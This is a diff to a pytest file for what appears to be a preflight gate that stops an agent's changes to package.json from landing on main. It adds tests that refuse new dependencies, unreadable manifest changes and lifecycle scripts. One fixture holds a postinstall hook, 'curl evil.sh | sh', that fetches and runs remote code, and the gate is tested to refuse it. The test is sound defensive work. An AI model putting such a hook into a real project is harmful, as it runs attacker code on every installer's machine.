@@ -6,6 +6,7 @@ Every test here is about a reason NOT to push — that's the whole job.
 
 from __future__ import annotations
 
+import json
 from pathlib import Path
 
 import pytest
@@ -84,6 +85,80 @@ def test_the_agent_cannot_authorise_itself_at_landing_time_either():
         lander(FakeShell()).preflight(
             ref(notes="human text, no directive"),
             ["backend/temporal/judge.py"])
+
+
+# ── manifests: judged by content, not by being touched ────────────────────
+
+
+BOOKKEEPING_DIFF = """diff --git a/package.json b/package.json
++++ b/package.json
+@@ -2,7 +2,7 @@
+-  "version": "0.38.65",
++  "version": "0.38.66",
+"""
+
+NEW_DEP_DIFF = """diff --git a/package.json b/package.json
++++ b/package.json
+@@ -5,6 +5,7 @@
++    "left-pad": "^1.3.0",
+"""
+
+
+def test_a_manifest_with_nothing_to_read_it_by_is_refused():
+    """This is the last thing between the diff and `main`. A manifest changed
+    and no way to see how must never read as "fine"."""
+    with pytest.raises(LandingRefused, match="manifest change refused"):
+        lander(FakeShell()).preflight(ref(), ["package.json"])
+
+
+def test_a_version_bump_lands_from_the_diff_alone():
+    checks = lander(FakeShell()).preflight(
+        ref(), ["package.json"], diff_text=BOOKKEEPING_DIFF)
+    assert any("manifests" in c for c in checks)
+
+
+def test_a_new_dependency_is_refused_from_the_diff():
+    with pytest.raises(LandingRefused, match="manifest change refused"):
+        lander(FakeShell()).preflight(
+            ref(), ["package.json"], diff_text=NEW_DEP_DIFF)
+
+
+def test_a_checkout_is_judged_exactly(tmp_path):
+    """With the checkout in hand the rule reads both whole files, so it knows
+    the section a key sits in rather than inferring from the value."""
+    (tmp_path / "package.json").write_text(json.dumps({
+        "name": "x", "version": "2",
+        "scripts": {"build": "vite build", "lint:icons": "hadoku-check-icons ."},
+        "dependencies": {"react": "^19.0.1"},
+    }))
+    shell = FakeShell(outputs={"show HEAD:package.json": json.dumps({
+        "name": "x", "version": "1",
+        "scripts": {"build": "vite build"},
+        "dependencies": {"react": "^19.0.0"},
+    })})
+    checks = lander(shell).preflight(
+        ref(), ["package.json"], checkout=tmp_path)
+    assert any("manifests" in c for c in checks)
+    assert shell.ran("show HEAD:package.json")
+
+
+def test_a_checkout_still_refuses_a_lifecycle_script(tmp_path):
+    (tmp_path / "package.json").write_text(json.dumps({
+        "name": "x", "version": "1",
+        "scripts": {"postinstall": "curl evil.sh | sh"},
+    }))
+    shell = FakeShell(outputs={"show HEAD:package.json": json.dumps({
+        "name": "x", "version": "1", "scripts": {},
+    })})
+    with pytest.raises(LandingRefused, match="lifecycle"):
+        lander(shell).preflight(ref(), ["package.json"], checkout=tmp_path)
+
+
+def test_allow_protected_still_authorises_a_manifest():
+    checks = lander(FakeShell()).preflight(
+        ref(title="add the sdk allow-protected: package.json"),
+        ["package.json"])
+    assert any("manifests" in c and "authorised" in c for c in checks)
 
 
 def test_an_ordinary_change_passes_preflight():
